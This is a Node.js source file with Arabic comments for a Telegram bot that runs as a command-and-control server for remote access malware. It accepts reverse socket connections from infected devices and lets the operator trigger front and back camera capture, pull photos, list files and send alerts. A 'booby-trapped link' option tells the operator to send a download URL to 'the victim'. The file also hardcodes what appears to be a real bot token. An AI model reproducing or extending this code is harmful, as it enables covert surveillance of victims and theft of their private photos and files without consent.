const { Telegraf, Markup } = require('telegraf');
const net = require('net');
const fs = require('fs');

const TOKEN = "8113157717:AAHUdnbkHj19lJHFhX4g93-GVSq9aE6nuLo";
const ADMIN_ID = 6654753506; 
const PORT = 10000;

let activeAgents = {}; // لتخزين الأجهزة المتصلة ومعرفاتها
const bot = new Telegraf(TOKEN);

// --- 1. خادم الاستقبال العكسي (C2 Server) ---
const server = net.createServer((socket) => {
    const agentId = `ID_${Math.floor(Math.random() * 1000)}`;
    activeAgents[agentId] = socket;
    
    bot.telegram.sendMessage(ADMIN_ID, `✅ جـهاز جـديد متصل الآن!\n🆔 المعرف: ${agentId}\n⚠️ افتح القائمة للتحكم.`);
    
    socket.on('close', () => { delete activeAgents[agentId]; });
    socket.on('error', () => { delete activeAgents[agentId]; });
});
server.listen(PORT, '0.0.0.0');

// --- 2. قائمة البداية (Start Menu) ---
bot.start((ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    ctx.reply('🛡️ مرحباً بك في مختبر التلغيم والتحكم. اختر وجهتك:', 
        Markup.inlineKeyboard([
            [Markup.button.callback('🛠️ إنشاء رابط ملغم', 'make_link'), Markup.button.callback('🖼️ تلغيم ملف/صورة', 'make_payload')],
            [Markup.button.callback('📱 الأجهزة المتصلة', 'list_agents')]
        ])
    );
});

// --- 3. معالج الأجهزة المتصلة (Control Center) ---
bot.action('list_agents', (ctx) => {
    const ids = Object.keys(activeAgents);
    if (ids.length === 0) return ctx.reply("❌ لا توجد أجهزة متصلة حالياً.");
    
    let buttons = ids.map(id => [Markup.button.callback(`🎮 تحكم في ${id}`, `control_${id}`)]);
    ctx.reply("🌐 الأجهزة النشطة بالمختبر:", Markup.inlineKeyboard(buttons));
});

// --- 4. قائمة التحكم الكامل بالضحية ---
bot.action(/^control_/, (ctx) => {
    const agentId = ctx.match.input.split('_')[1];
    ctx.reply(`🎮 التحكم الكامل في [${agentId}]:`, 
        Markup.inlineKeyboard([
            [Markup.button.callback('📸 كاميرا أمامية', `cmd_${agentId}_cam1`), Markup.button.callback('📸 كاميرا خلفية', `cmd_${agentId}_cam0`)],
            [Markup.button.callback('🔔 إرسال إشعار', `cmd_${agentId}_alert`), Markup.button.callback('📳 اهتزاز', `cmd_${agentId}_vibrate`)],
            [Markup.button.callback('🖼️ سحب الصور', `cmd_${agentId}_pull`), Markup.button.callback('📂 قائمة الملفات', `cmd_${agentId}_ls`)]
        ])
    );
});

// --- 5. إرسال الأوامر عبر السوكيت ---
bot.action(/^cmd_/, (ctx) => {
    const parts = ctx.match.input.split('_');
    const agentId = parts[1];
    const command = parts[2];
    
    if (activeAgents[agentId]) {
        activeAgents[agentId].write(command);
        ctx.answerCbQuery(`🚀 تم إرسال أمر ${command}...`);
    } else {
        ctx.reply("❌ انقطع اتصال الجهاز.");
    }
});

// --- 6. منطق التلغيم (Payload Generation) ---
bot.action('make_link', (ctx) => {
    ctx.reply("🔗 الرابط الملغم جاهز:\n`http://your-app.onrender.com/download` \n(أرسله للضحية، بمجرد فتحه سيتصل بك)");
});

bot.launch();
